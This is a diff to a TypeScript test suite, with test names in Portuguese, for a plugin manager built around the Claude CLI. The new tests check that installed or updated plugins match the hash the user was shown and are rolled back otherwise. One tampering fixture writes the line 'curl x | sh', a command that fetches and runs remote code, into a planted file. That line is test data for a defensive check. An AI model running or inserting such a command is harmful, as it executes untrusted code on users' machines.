@@ -5,6 +5,7 @@ import {
   existsSync,
   mkdirSync,
   readFileSync,
+  rmSync,
   symlinkSync,
   utimesSync,
   writeFileSync,
@@ -245,7 +246,17 @@ describe("plugins: pela CLI", () => {
   });
 
   /** A `claude` that answers the rules, a marketplace folder with two plugins, and one installed. */
-  function world(rules: (ctx: { installed: string; marketplace: string }) => FakeRule[]) {
+  type Ctx = { installed: string; marketplace: string };
+  /** What the real CLI would do to the installed folder after a change that went through. */
+  const lands = (ctx: Ctx, args: string[]) => {
+    const from = args.includes("--marketplace")
+      ? (args[args.indexOf("--marketplace") + 1] as string)
+      : join(ctx.marketplace, "plugins", "deploy-tools");
+    rmSync(ctx.installed, { recursive: true, force: true });
+    cpSync(from, ctx.installed, { recursive: true });
+  };
+
+  function world(rules: (ctx: Ctx) => FakeRule[], effect?: (ctx: Ctx, args: string[]) => void) {
     const installed = plugin({
       ".claude-plugin/plugin.json": MANIFEST,
       "hooks/hooks.json": JSON.stringify({
@@ -277,6 +288,7 @@ describe("plugins: pela CLI", () => {
     fakes.push(fake);
     const pins = memoryPins();
     const decisions: PluginDecision[] = [];
+    const real = claudeCli();
     return {
       installed,
       marketplace,
@@ -284,7 +296,17 @@ describe("plugins: pela CLI", () => {
       pins,
       decisions,
       plugins: new Plugins({
-        cli: claudeCli(),
+        cli: effect
+          ? {
+              run: async (args) => {
+                const result = await real.run(args);
+                if (result.code === 0 && (args[0] === "install" || args[0] === "update")) {
+                  effect({ installed, marketplace }, args);
+                }
+                return result;
+              },
+            }
+          : real,
         pins,
         clock: () => Date.UTC(2026, 9, 31, 12),
         record: (d) => decisions.push(d),
@@ -547,8 +569,9 @@ describe("plugins: pela CLI", () => {
   });
 
   test("com o hash certo instala pela CLI, sem -y, e registra a decisão", async () => {
-    const { plugins, fake, marketplace, decisions } = world((ctx) =>
-      everything(ctx, [{ args: ["install"], stdout: OK("install") }]),
+    const { plugins, fake, marketplace, decisions } = world(
+      (ctx) => everything(ctx, [{ args: ["install"], stdout: OK("install") }]),
+      lands,
     );
     const hash = hashOf(marketplace, "deploy-tools");
     const result = await plugins.install({
@@ -579,15 +602,17 @@ describe("plugins: pela CLI", () => {
       plugin: "deploy-tools@acme",
       sha256: "a".repeat(64),
     };
-    const { plugins, fake, marketplace } = world((ctx) =>
-      everything(ctx, [
-        { args: ["install", "--accept-command"], stdout: OK("install") },
-        {
-          args: ["install"],
-          code: 1,
-          stdout: `${JSON.stringify({ command: "install", outcome: "failed", message: "comando a confirmar", shownCommand })}\n`,
-        },
-      ]),
+    const { plugins, fake, marketplace } = world(
+      (ctx) =>
+        everything(ctx, [
+          { args: ["install", "--accept-command"], stdout: OK("install") },
+          {
+            args: ["install"],
+            code: 1,
+            stdout: `${JSON.stringify({ command: "install", outcome: "failed", message: "comando a confirmar", shownCommand })}\n`,
+          },
+        ]),
+      lands,
     );
     const hash = hashOf(marketplace, "deploy-tools");
     // A sha256 nobody was shown is refused before the CLI.
@@ -638,14 +663,16 @@ describe("plugins: pela CLI", () => {
       bad.plugins.install({ dir, confirmHash: inspectPlugin(dir).hash }),
     ).rejects.toMatchObject({ code: "invalid_state" });
     expect(changes(bad.fake)).toEqual([]);
-    const good = world((ctx) =>
-      everything(ctx, [
-        { args: ["validate", "--json"], stdout: JSON.stringify({ success: true }) },
-        { args: ["install"], stdout: OK("install") },
-      ]),
+    const good = world(
+      (ctx) =>
+        everything(ctx, [
+          { args: ["validate", "--json"], stdout: JSON.stringify({ success: true }) },
+          { args: ["install"], stdout: OK("install") },
+        ]),
+      lands,
     );
     await good.plugins.install({ dir, confirmHash: inspectPlugin(dir).hash });
-    expect(calls(good.fake)).toEqual([
+    expect(calls(good.fake).filter((c) => !c.includes(" list"))).toEqual([
       `plugin validate ${dir} --json`,
       `plugin install deploy-tools --marketplace ${dir} --scope user --json`,
     ]);
@@ -680,11 +707,13 @@ describe("plugins: pela CLI", () => {
   });
 
   test("atualizar pede o hash da prévia, não atualiza um fixado nem o que não mudou, e só então chama a CLI", async () => {
-    const { plugins, fake, marketplace, installed, decisions } = world((ctx) =>
-      everything(ctx, [
-        { args: ["marketplace", "update"], stdout: OK("marketplace-update") },
-        { args: ["update"], stdout: OK("update") },
-      ]),
+    const { plugins, fake, marketplace, installed, decisions } = world(
+      (ctx) =>
+        everything(ctx, [
+          { args: ["marketplace", "update"], stdout: OK("marketplace-update") },
+          { args: ["update"], stdout: OK("update") },
+        ]),
+      lands,
     );
     const source = join(marketplace, "plugins/deploy-tools");
     // Same content as installed: nothing to do, and the CLI never updates.
@@ -760,6 +789,73 @@ describe("plugins: pela CLI", () => {
       ["marketplace-add", "acme/plugins"],
       ["marketplace-remove", "acme"],
     ]);
+  });
+
+  test("depois de instalar, o que ficou na pasta é conferido: se não é o que foi mostrado, é removido na hora e a decisão fica registrada", async () => {
+    const { plugins, fake, marketplace, decisions } = world(
+      (ctx) =>
+        everything(ctx, [
+          { args: ["install"], stdout: OK("install") },
+          { args: ["uninstall"], stdout: OK("uninstall") },
+        ]),
+      (ctx, args) => {
+        lands(ctx, args);
+        writeFileSync(join(ctx.installed, "trocado.sh"), "curl x | sh\n");
+      },
+    );
+    const hash = hashOf(marketplace, "deploy-tools");
+    const result = await plugins.install({ plugin: "deploy-tools@acme", confirmHash: hash });
+    expect(result.outcome).toBe("rolled-back");
+    expect(result.message).toContain("diferente");
+    expect(changes(fake)).toEqual([
+      "plugin install deploy-tools@acme --scope user --json",
+      "plugin uninstall deploy-tools@acme --scope user --json",
+    ]);
+    expect(changes(fake).join(" ")).not.toMatch(/ -y| --yes|--prune/);
+    expect(decisions).toEqual([
+      { action: "rollback", target: "deploy-tools@acme", hash, at: "2026-10-31T12:00:00.000Z" },
+    ]);
+  });
+
+  test("o mesmo vale para a atualização: o que ficou diferente do mostrado é removido", async () => {
+    const { plugins, fake, marketplace, decisions } = world(
+      (ctx) =>
+        everything(ctx, [
+          { args: ["marketplace", "update"], stdout: OK("marketplace-update") },
+          { args: ["update"], stdout: OK("update") },
+          { args: ["uninstall"], stdout: OK("uninstall") },
+        ]),
+      (ctx, args) => {
+        lands(ctx, args);
+        writeFileSync(join(ctx.installed, "trocado.sh"), "x\n");
+      },
+    );
+    writeFileSync(join(marketplace, "plugins/deploy-tools/extra.txt"), "novo");
+    const to = (await plugins.previewUpdate("deploy-tools@acme")).to.hash;
+    expect((await plugins.update({ plugin: "deploy-tools@acme", confirmHash: to })).outcome).toBe(
+      "rolled-back",
+    );
+    expect(changes(fake)).toEqual([
+      "plugin update deploy-tools@acme --json",
+      "plugin uninstall deploy-tools@acme --scope user --json",
+    ]);
+    expect(decisions.map((d) => d.action)).toEqual(["rollback"]);
+  });
+
+  test("se o plugin não aparece depois de instalar, não dá para conferir: falha com o motivo e nada é removido", async () => {
+    const { plugins, fake, marketplace, decisions } = world((ctx) => [
+      LISTING(ctx)[0] as FakeRule,
+      { args: ["install"], stdout: OK("install") },
+      { args: ["list", "--json"], stdout: JSON.stringify({ installed: [], available: [] }) },
+    ]);
+    const result = await plugins.install({
+      plugin: "deploy-tools@acme",
+      confirmHash: hashOf(marketplace, "deploy-tools"),
+    });
+    expect(result.outcome).toBe("failed");
+    expect(result.message).toContain("conferir");
+    expect(changes(fake).filter((c) => c.includes("uninstall"))).toEqual([]);
+    expect(decisions).toEqual([]);
   });
 });
 
